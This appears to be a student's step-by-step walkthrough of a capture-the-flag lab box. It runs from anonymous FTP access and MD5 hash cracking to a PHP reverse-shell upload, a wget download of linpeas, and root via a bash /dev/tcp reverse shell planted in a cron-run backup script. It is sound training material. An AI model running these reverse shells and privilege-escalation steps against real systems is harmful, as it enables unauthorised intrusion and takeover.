
- 1 - Scan with Nmap
- 2 - notice port 21 is open and allow anonymous login (21/tcp open  ftp     vsftpd 3.0.3) (ftp-anon: Anonymous FTP login allowed)
- 3 - Login using "ftp 192.168.138.136", Anonymous, Anonymous"
- 4 - use "get note.txt" and cat it in our system. 
- 5 - there is a username andf password. The password looks like it is a hash. We can use "hash-identifier" to check.
- 6 - run "hash-identifier" on terminala and past the hash 
	- Result: HASH: cd73502828457d15655bbd7a63fb0bc8
	Possible Hashs:
	[+] MD5
	[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
- 7 - Search on google how to crack the hash: "hashcat crack md5 hash"
	- hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
	- https://www.4armed.com/blog/hashcat-crack-md5-hashes/
- 8 - use dirbuster& and find all the directoreies, specially the academy and log in useing the dehashed paswrord. 
- 9 - There is an upload feature that could be used to load malitions code. We can see the website is running php. the url is "my-profile.php".
- 10 - We search for a php reverse shell. https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php. Change the ip to be our IP and run on the terminal "nc -nvlp 1234" before uploading the shell.
- 11 - Once we are inside we notice we are not root. We will need to do previlige escalation. We will use LinPeas to help us detenc what we can do. Search for linpeas (https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and dowload linpeas.sh. Then on the dowload folder we will host a python server using "python3 -m http.server 80" and the we go to the /tmp directory in the vulnerable machine and dowload the linpeas.sh using "wget http://192.168.138.132/linpeas.sh" and turn the file executable using "chmod +x linpeas.sh" and run "./linpeas.sh"
- 12 - We notice thre is a passwrod on the config.php file "My_V3ryS3cur3_P4ss". Openning the file we see more information like username: grimmie. 
- 13 - We can try "cat etc/passwd" and we notice user grimmie is administrator. Knowing this we can try connecting using "ssh grimmie@192.168.138.136" and the passwrod on the file "My_V3ryS3cur3_P4ss".
- 14 - Inside we can try to list the processes running but nothing will be usefull for now. When this happens we can use a toll called "pspy" (https://github.com/DominicBreuker/pspy). This will list all the processes running in the machine. 
- We found the backup.sh is running every minute. 
	-  CMD: UID=0     PID=28705  | /bin/bash home/grimmie/backup.sh 
- 15- We can abuse this process and gain root access. We will search for a "bash reverse shell one liner" (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
- 16 - use "nano backup.sh" and past the code "bash -i >& /dev/tcp/192.168.138.132/8081 0>&1" (ctrl+k to delete lines in nano) with my ip and port and set up a "nc -nvlp 8081".  Wait untill the process runs again and you will be root. 
